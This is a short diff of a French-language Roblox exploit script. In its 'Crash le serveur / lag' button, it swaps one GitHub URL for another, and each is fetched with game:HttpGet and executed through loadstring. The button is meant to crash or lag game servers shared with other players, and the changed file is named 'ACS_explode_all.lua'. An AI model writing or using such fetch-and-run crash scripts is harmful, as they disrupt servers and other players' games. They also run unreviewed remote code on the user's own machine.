@@ -53,7 +53,7 @@ Section:NewSlider("Jump power", "Change la force de saut du joueur", 500, 50, fu
 end)
 
 Section:NewButton("Crash le serveur / lag", "Crash le serveur / le faire lag", function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/lobox920/SFscripthehe/main/Crashserveur.lua')))()
+    loadstring(game:HttpGet(('https://github.com/lobox920/RBLXScript/blob/main/ACS_explode_all.lua')))()
 end)
 
 ------------------------- CREDITS -------------------------
